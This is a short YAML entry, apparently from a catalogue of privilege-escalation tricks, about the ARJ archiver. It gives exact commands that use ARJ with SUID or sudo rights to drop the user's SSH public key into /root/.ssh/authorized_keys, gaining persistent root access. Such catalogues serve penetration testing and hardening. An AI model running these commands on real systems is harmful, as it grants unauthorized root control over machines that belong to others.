---
description: ARJ (Archived by Robert Jung) is a software tool designed by Robert K. Jung for creating high-efficiency compressed file archives.
functions:
   suid:
    - description: |
    If ARJ is SUID you can copy your public ssh-key into roots authorized_keys. If the ssh-folder doesnt exist, it gets created with the right permissions.
    First we create an archive with our authorized_keys, then we extract it in right location.
    - code: "./arj a authorized_keys"
    - code: "./arj x authorized_keys.arj /root/.ssh/"
  sudo:
    - description: |
    If you can run arj with sudo priviledges you can copy your public ssh-key into roots authorized_keys. If the ssh-folder doesnt exist, it gets created with the right permissions.
    First we create an archive with our authorized_keys, then we extract it in right location.
    - code: "sudo /usr/bin/arj a authorized_keys"
    - code: "sudo /usr/bin/arj x authorized_keys.arj /root/.ssh/"
---
